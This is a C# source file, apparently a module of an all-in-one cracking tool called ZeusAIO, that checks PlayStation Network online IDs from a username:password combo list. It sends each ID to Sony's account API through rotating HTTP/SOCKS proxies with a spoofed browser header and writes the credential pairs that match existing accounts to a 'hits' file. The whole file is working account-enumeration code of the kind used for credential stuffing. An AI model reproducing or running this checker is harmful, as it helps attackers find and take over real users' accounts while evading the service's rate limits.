using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;

namespace PsnValidMail
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AllowAutoRedirect = false;
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("Referer", "https://id.sonyentertainmentnetwork.com/create_account/?entry=%2Fcreate_account&tp_psn=true&ui=pr&client_id=" + "7cd4e9b5-9763-4138-91ba-7bf7c0a7a020" + "&redirect_uri=https://secure.eu.playstation.com/psnauth/PSNOAUTHResponse/pdc/&request_locale=en_US&response_type=code&scope=psn:s2s&service_entity=urn:service-entity:psn&service_logo=ps");

                            var res0 = req.Post("https://accounts.api.playstation.com/api/v1/accounts/onlineIds", "{\"onlineId\":\"" + s[0] + "\",\"reserveIfAvailable\":true}", "application/json");
                            string text0 = res0.ToString();

                            if (text0.Contains("Account with this online id already exists") || text0.Contains("\"code\":\"3101\""))
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - PSN (VM)] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/PsnValidMail_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                            else if (text0.Contains("\"expirationDate\":\"") || text0.Contains("string is too long"))
                            {
                                break;
                            }
                            else if (text0.Contains("Access Denied"))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }


                        }

                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
        